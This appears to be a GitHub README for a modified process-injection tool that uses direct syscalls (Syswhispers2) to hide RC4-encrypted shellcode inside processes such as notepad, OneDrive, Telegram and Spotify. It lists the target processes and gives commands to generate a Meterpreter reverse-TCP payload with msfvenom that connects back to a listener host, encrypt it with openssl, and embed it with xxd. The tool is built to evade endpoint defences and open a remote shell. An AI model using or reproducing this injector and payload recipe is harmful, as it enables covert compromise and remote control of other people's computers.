# DefensiveInjector

This is a modified version of [bats3c's DefensiveInjector](https://github.com/bats3c/DefensiveInjector) using the same encryption method but Syswhispers2 for the Syscalls instead.

In addition I modified the code, so that it's injecting into one of the processes of the `targets[]` array:

```cpp
    static const LPCSTR targets[] = {
                            L"notepad.exe",
                            L"OneDrive.exe",
                            L"Telegram.exe",
                            L"Messenger.exe",
                            L"Spotify.exe"
    };
```

All processes are queried via `NtQuerySystemInformation` until one of the processes for injection is found.

## Using different shellcode

- ##### Generate your shellcode either with msfvenom or something else
    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin`

- ##### Encrypt the shellcode
    Keeping in mind that if you change it here you will need to update the key on line 132 in `main.c`
    `cat meter.bin | openssl enc -rc4 -nosalt -k "S3cur3Th1sSh1t" > encmeter.bin`

- ##### Format the shellcode
    Run `xxd -i encmeter.bin` then replace everything between line 10-60 with the output